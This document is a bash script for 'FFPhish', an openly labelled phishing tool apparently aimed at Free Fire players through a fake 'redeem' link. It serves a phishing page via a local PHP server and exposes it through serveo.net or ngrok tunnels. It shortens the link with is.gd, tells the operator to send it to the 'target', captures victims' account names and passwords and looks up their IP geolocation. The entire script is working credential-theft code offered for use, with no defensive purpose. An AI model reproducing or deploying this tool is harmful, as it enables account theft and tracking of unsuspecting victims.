#!/bin/bash
# FFPhish 
# Coded by: Uni-Creator
# Github: https://github.com/Uni-Creator/FFPhish



trap 'printf "\n";stop1;exit 1' 2

#server = "FF"

#Check if all required dependencies are installed or not

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {


printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the server (Y/n): \e[0m' option


if [[ $option == 'n' || $option == 'N' ]]; then
exit 1

elif [[ $option == 'y' || $option == 'Y' ]]; then
clear
server="FF"
start1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
banner
menu
fi
}

stop1() {

pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1

pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1

pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1

if [[ -e sendlink ]]; then
rm -rf sendlink
fi

exit 1

}

banner() {

printf "\e[1;92m ███████╗███████╗    ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
printf "\e[1;92m ██╔════╝██╔════╝    ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
printf "\e[1;92m █████╗  █████╗      ██████╔╝██║███████╗███████║ \e[0m\n"
printf "\e[1;92m ██╔══╝  ██╔══╝      ██╔═══╝ ██║╚════██║██╔══██║ \e[0m\n"
printf "\e[1;92m ██║     ██║         ██║     ██║███████║██║  ██║ \e[0m\n"
printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Uni-Creator \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
}

catch_cred() {

account=$(grep -o 'Account:.*' $server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' $server/usernames.txt | cut -d ":" -f2)
IFS=$'\n'
agent=$(grep -o 'Agent:.*' $server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Agent:\e[0m\e[1;77m %s\n\e[0m" $agent
cat $server/usernames.txt >> $server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.usernames.txt\e[0m\n" $server

stop1

}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch $server/saved.usernames.txt
ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
#IFS=$'\n'
#ua=$(grep 'User-Agent:' $server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
#printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat $server/ip.txt >> $server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}

##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd $server && php -S 127.0.0.1:$port index.php > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 5 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$send_link&shorturl=ff_garena_redeems' | grep -o "https://is.gd/ff_garena_redeems")
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using is.gd (Shortener):\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e $server/ip.txt ]]; then
rm -rf $server/ip.txt

fi
if [[ -e $server/usernames.txt ]]; then
rm -rf $server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

serverx

}


##

start() {
if [[ -e $server/ip.txt ]]; then
rm -rf $server/ip.txt

fi
if [[ -e $server/usernames.txt ]]; then
rm -rf $server/usernames.txt

fi

cd ..
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == 'arm' ]] || [[ $arch2 == 'Android' ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi


else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
#cd FFPhish

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd FFPhish/$server && php -S 127.0.0.1:$port index.php> /dev/null 2>&1 & 
sleep 2

printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
cd .. && ./ngrok http $port > /dev/null 2>&1  &
sleep 5
cd FFPhish

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link

send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$link' | grep -o "https://is.gd//[\w-\.]*")

#send_ip=$'https://is.gd/ff_garena_redeems'

printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Default)\e[0m\n"
default_option_server="2"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf $server/ip.txt
fi
#sleep 0.5
if [[ -e "$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf $server/usernames.txt
fi
sleep 0.5
done 

}
clear
banner
dependencies
menu